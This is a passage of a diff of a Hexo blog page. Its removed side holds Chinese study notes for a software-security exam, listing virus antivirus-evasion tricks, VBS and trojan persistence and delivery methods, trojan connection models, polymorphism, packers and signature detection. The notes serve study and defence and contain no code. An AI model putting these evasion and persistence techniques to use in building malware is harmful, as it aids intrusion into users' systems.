-<h2 id="脚本病毒"><a href="#脚本病毒" class="headerlink" title="脚本病毒"></a>脚本病毒</h2><h3 id="脚本病毒对抗反病毒软件的技巧"><a href="#脚本病毒对抗反病毒软件的技巧" class="headerlink" title="脚本病毒对抗反病毒软件的技巧"></a>脚本病毒对抗反病毒软件的技巧</h3><p><strong>自加密<br>巧妙运用Execute函数<br>改变某些对象的声明方法<br>直接关闭反病毒软件</strong></p>
-<h3 id="VBS脚本病毒如何获得控制权"><a href="#VBS脚本病毒如何获得控制权" class="headerlink" title="VBS脚本病毒如何获得控制权"></a>VBS脚本病毒如何获得控制权</h3><ol>
-<li>修改注册表启动项</li>
-<li>添加程序到“开始”-“程序”-“启动”选项</li>
-<li>修改系统配置文件win.ini、system.ini、wininit.ini、winstart.bat、autoexec.bat等的相关启动选项。</li>
-<li>通过映射文件执行方式</li>
-<li>欺骗用户，让用户自己执行</li>
-<li>desktop.ini和folder.htt互相配合</li>
-</ol>
-<h1 id="第七章-木马与后门"><a href="#第七章-木马与后门" class="headerlink" title="第七章 木马与后门"></a>第七章 木马与后门</h1><p>木马的特性 欺骗性、隐藏性、非授权性、交互性<br>木马的概念 通过欺骗或诱骗的方式安装，并在用户的计算机中隐藏以实现控制用户计算机的目的。</p>
-<h2 id="木马的分类"><a href="#木马的分类" class="headerlink" title="木马的分类"></a>木马的分类</h2><p>远程控制型木马<br>信息获取型木马<br>破坏型木马</p>
-<h2 id="木马的植入方式"><a href="#木马的植入方式" class="headerlink" title="木马的植入方式"></a>木马的植入方式</h2><p>网页挂马植入 eg 自动下载安装（MS06-014,MS10-002）<br>电子邮件植入 eg 附件形式，打开附件被植入、电子邮件与恶意网页相结合，即使不打开附件，选中就会被植入（以HTML格式发送，如求职者&#x2F;求职信）<br>文档捆绑植入 eg office文档、pdf文档漏洞等<br>伪装欺骗植入 eg更改后缀名（Unicode翻转字符）、图标伪装<br>捆绑植入  eg EXE捆绑、文档嵌入、多媒体文件、电子书植入、Winrar自解压功能、 GoFileBinder-GitHub<br>其他如特定U盘植入（故意丢弃、或者工作U盘、数据拷贝等）MicroTrend APT视频中的内容或是通过社工植入</p>
-<h2 id="木马的通信方式"><a href="#木马的通信方式" class="headerlink" title="木马的通信方式"></a>木马的通信方式</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-4.png" alt="alt text"></p>
-<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>攻击者无需外部IP地址<br>木马样本也不会泄露攻击者IP地址</p>
-<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>可能被防火墙阻挡<br>被攻击者必须具备外部IP地址<br>定位被攻击者相对困难</p>
-<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><h4 id="直接连接"><a href="#直接连接" class="headerlink" title="直接连接"></a>直接连接</h4><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-5.png" alt="alt text"></p>
-<h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><p>通过防火墙相对容易<br>攻击目标随时上线、随时控制<br>可以控制局域网内的目标</p>
-<h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><p>样本会暴露控制服务器信息（域名或IP）<br>攻击者通常应当具有外部IP</p>
-<h4 id="间接连接"><a href="#间接连接" class="headerlink" title="间接连接"></a>间接连接</h4><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-6.png" alt="alt text"></p>
-<h5 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h5><p>可绕过防火墙，自动连接上线，不易被发现（代理）</p>
-<h5 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h5><p>肉鸡的稳定性需要保障</p>
-<h2 id="木马的结构"><a href="#木马的结构" class="headerlink" title="木马的结构"></a>木马的结构</h2><p>完整的木马一般由木马配置程序、控制端程序（客户端）和被控制端程序（服务端程序）等三部分组成。<br><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-7.png" alt="alt text"></p>
-<h2 id="木马检测思路"><a href="#木马检测思路" class="headerlink" title="木马检测思路"></a>木马检测思路</h2><p>静态文件特征<br>网络流量特征<br>系统行为特征<br>功能行为特征<br>攻击意图等</p>
-<h1 id="第八章-网络蠕虫"><a href="#第八章-网络蠕虫" class="headerlink" title="第八章 网络蠕虫"></a>第八章 网络蠕虫</h1><h2 id="莫里斯蠕虫"><a href="#莫里斯蠕虫" class="headerlink" title="莫里斯蠕虫"></a>莫里斯蠕虫</h2><p>利用的漏洞类型</p>
-<ul>
-<li>Fingerd的缓冲区溢出</li>
-<li>Sendmail 的debug模式</li>
-<li>Rsh&#x2F;rexec：用户的缺省认证</li>
-</ul>
-<h2 id="网络蠕虫基本功能"><a href="#网络蠕虫基本功能" class="headerlink" title="网络蠕虫基本功能"></a>网络蠕虫基本功能</h2><ul>
-<li>信息收集：主要完成对本地和目标节点主机的信息汇集。</li>
-<li>扫描探测：主要完成对具体目标主机服务漏洞的检测。</li>
-<li>攻击渗透：利用已发现的服务漏洞实施攻击［控制权获取］。</li>
-<li>自我推进：完成对目标节点的感染［蠕虫主体程序传输］。</li>
-</ul>
-<h1 id="第九章-恶意代码检测技术"><a href="#第九章-恶意代码检测技术" class="headerlink" title="第九章 恶意代码检测技术"></a>第九章 恶意代码检测技术</h1><h2 id="pre知识"><a href="#pre知识" class="headerlink" title="pre知识"></a>pre知识</h2><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-11.png" alt="alt text"></p>
-<h2 id="静态检测技术"><a href="#静态检测技术" class="headerlink" title="静态检测技术"></a>静态检测技术</h2><h3 id="BM算法"><a href="#BM算法" class="headerlink" title="BM算法"></a>BM算法</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/DBC_121/article/details/105569440">https://blog.csdn.net/DBC_121/article/details/105569440</a></p>
-<h3 id="AC状态机"><a href="#AC状态机" class="headerlink" title="AC状态机"></a>AC状态机</h3><h3 id="Veldman算法"><a href="#Veldman算法" class="headerlink" title="Veldman算法"></a>Veldman算法</h3><h3 id="Wu-Manber算法"><a href="#Wu-Manber算法" class="headerlink" title="Wu-Manber算法"></a>Wu-Manber算法</h3><ol>
-<li>创建一个哈希表，将模式的每个可能子字符串映射到该子字符串出现的模式位置。</li>
-<li>该哈希表用于快速识别文本中模式的潜在起始位置。</li>
-<li>遍历文本并将每个字符与模式中的相应字符进行比较。</li>
-<li>如果字符匹配，则可以移动到下一个字符并继续比较。</li>
-<li>如果字符不匹配，可以使用哈希表来确定在模式的下一个潜在起始位置之前可以跳过的最大字符数。</li>
-<li>这允许算法快速跳过大部分文本，而不会错过任何潜在的匹配项。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/pi9nc/article/details/9124623">https://blog.csdn.net/pi9nc/article/details/9124623</a></li>
-</ol>
-<h2 id="计算机病毒的隐藏策略"><a href="#计算机病毒的隐藏策略" class="headerlink" title="计算机病毒的隐藏策略"></a>计算机病毒的隐藏策略</h2><h3 id="不隐藏"><a href="#不隐藏" class="headerlink" title="不隐藏"></a>不隐藏</h3><p>不隐藏策略实现病毒时容易，但不是很有效。</p>
-<h3 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h3><p>异或，密钥为常量<br><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-8.png" alt="alt text"></p>
-<h3 id="隐形"><a href="#隐形" class="headerlink" title="隐形"></a>隐形</h3><h3 id="反向隐形、Rootkit"><a href="#反向隐形、Rootkit" class="headerlink" title="反向隐形、Rootkit"></a>反向隐形、Rootkit</h3><p>使所有文件看起来都被感染了,引发防毒软件误杀。<br>利用rootkit技术隐藏自身</p>
-<h3 id="单变形"><a href="#单变形" class="headerlink" title="单变形"></a>单变形</h3><p>单变形（简单变形&#x2F;寡态病毒&#x2F;半多态病毒）（Oligomorphism）：每次感染都用备选的不同加密算法Whale病毒，30个备选；Memorial病毒，96个备选。</p>
-<h3 id="准变形（多态）病毒（Polymorphism）"><a href="#准变形（多态）病毒（Polymorphism）" class="headerlink" title="准变形（多态）病毒（Polymorphism）"></a>准变形（多态）病毒（Polymorphism）</h3><p>每次感染时用的解密循环体不同。但不是备选抽取，而是直接改变代码。（与单变形相似，但本质不同）</p>
-<h4 id="自识别问题"><a href="#自识别问题" class="headerlink" title="自识别问题"></a>自识别问题</h4><p>如果病毒每次感染后（即便是不同文件夹或者不同主机上完全相同的文件），都用不同加密算法，那么病毒如何判断该文件已经被感染过？<br>文件签名或标记</p>
-<h4 id="实现问题"><a href="#实现问题" class="headerlink" title="实现问题"></a>实现问题</h4><p>如何完成准变形病毒功能（每次感染的解密循环都不同）</p>
-<ol>
-<li>指令等价</li>
-<li>序列等价</li>
-<li>指令重排</li>
-<li>寄存器换名</li>
-<li>数据重排</li>
-<li>运行时生成指令</li>
-<li>解释性跳转</li>
-<li>Concurrency 并发执行</li>
-</ol>
-<h3 id="全变形"><a href="#全变形" class="headerlink" title="全变形"></a>全变形</h3><p>不进行加密，直接对病毒主体本身进行变形。没有进行加密，不需要解密器循环;原理上与准变形类似<br>LLVM混淆obfuscator-llvm&#x2F;obfuscator</p>
-<h2 id="动态检测技术"><a href="#动态检测技术" class="headerlink" title="动态检测技术"></a>动态检测技术</h2><h2 id="主动防御技术"><a href="#主动防御技术" class="headerlink" title="主动防御技术"></a>主动防御技术</h2><h3 id="什么是恶意代码的特征码？"><a href="#什么是恶意代码的特征码？" class="headerlink" title="什么是恶意代码的特征码？"></a>什么是恶意代码的特征码？</h3><p>特征码是指一段特定的二进制代码序列，这段序列是恶意软件特有的标识。每个恶意软件都有其独特的代码结构和行为模式，这些独特的部分可以被提取出来作为特征码。</p>
-<h3 id="特征码检测的原理"><a href="#特征码检测的原理" class="headerlink" title="特征码检测的原理"></a>特征码检测的原理</h3><ul>
-<li>特征库建立：首先，安全研究人员会分析已知的恶意软件样本，从中提取出具有代表性的代片段或行为模式，并将这些信息存储在特征库中。</li>
-<li>扫描文件：当一个文件需要被检查时，反病毒软件会读取该文件的内容，并将其与特征库中的特征码进行比对。</li>
-<li>匹配判断：如果文件中的某段代码与特征库中的某个特征码完全匹配或高度相似，则认为该文件可能包含恶意代码。</li>
-<li>处理措施：一旦发现匹配，反病毒软件会采取相应的措施，如隔离、删除或报告给用户。</li>
-</ul>
-<h3 id="什么是组合特征码？"><a href="#什么是组合特征码？" class="headerlink" title="什么是组合特征码？"></a>什么是组合特征码？</h3><p>组合特征码是指通过组合多个单一特征码来提高检测准确率的方法。单一特征码可能会因为恶意软件的变种而失效，因此组合特征码能够更全面地覆盖恶意软件的不同变种。例如，一个组合特征码可能包括多个API调用序列、特定的字符串模式以及文件行为等多方面的特征。</p>
-<h1 id="杂项问题"><a href="#杂项问题" class="headerlink" title="杂项问题"></a>杂项问题</h1><h2 id="1-加壳的原理是什么"><a href="#1-加壳的原理是什么" class="headerlink" title="1. 加壳的原理是什么"></a>1. 加壳的原理是什么</h2><p>壳是指在一个程序外部再包裹的另外一段代码,是能够保护内部程序的代码不被非<br>法修改或者反编译的外部程序<br>常见的壳有<br>压缩壳： 1、UPX 2、ASPack 3、PECompact 4、RLPack 5、NSPack<br>保护壳: 1、ASProtect 2、Armadillo 3、EXECryptor 4、Themida 5、VMProtect<br>捆绑壳： MOleBox</p>
-<h2 id="2-叙述一下对引导区的病毒清除的清除过程，重新装机除外"><a href="#2-叙述一下对引导区的病毒清除的清除过程，重新装机除外" class="headerlink" title="2. 叙述一下对引导区的病毒清除的清除过程，重新装机除外"></a>2. 叙述一下对引导区的病毒清除的清除过程，重新装机除外</h2><p><img src="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/image-12.png" alt="alt text"></p>
-
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>2018 Autumn CS229 Lecture9笔记</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/02/13/Lecture9/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/" data-id="cm7e2695r0009p0tx6ip7acqy" data-title="软件安全复习" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
       
     </footer>
-  </div>
-  
-</article>
+  </article>
+</div>
 
 
 
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/02/13/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2025-02-13T02:31:22.626Z" itemprop="datePublished">2025-02-13</time>
-</a>
+
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
+
+
+<div class="post-block">
   
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/02/13/hello-world/">Hello World</a>
-    </h1>
   
 
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/" class="post-title-link" itemprop="url">软件安全复习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-02-13 19:15:28" itemprop="dateCreated datePublished" datetime="2025-02-13T19:15:28+08:00">2025-02-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-02-21 17:19:28" itemprop="dateModified" datetime="2025-02-21T17:19:28+08:00">2025-02-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
       </header>
+
     
-    <div class="e-content article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>软件安全复习总结</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/13/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/13/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-02-13 10:31:22 / Modified: 19:22:54" itemprop="dateCreated datePublished" datetime="2025-02-13T10:31:22+08:00">2025-02-13</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
@@ -824,132 +633,75 @@
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/02/13/hello-world/" data-id="cm7e2695l0001p0tx50yh9f44" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
       
     </footer>
+  </article>
+</div>
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe</span>
   </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a></li></ul>
-    </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/2018Autumn/" rel="tag">2018Autumn</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/2018Autumn/" style="font-size: 10px;">2018Autumn</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2025/02/21/%E4%BF%A1%E6%81%AF%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/">信息与网络安全课程设计</a>
-          </li>
-        
-          <li>
-            <a href="/2025/02/13/Lecture9/">Lecture9</a>
-          </li>
-        
-          <li>
-            <a href="/2025/02/13/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/">软件安全复习</a>
-          </li>
-        
-          <li>
-            <a href="/2025/02/13/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2025 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
 
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
+  </footer>
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
   </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
 </body>
 </html>
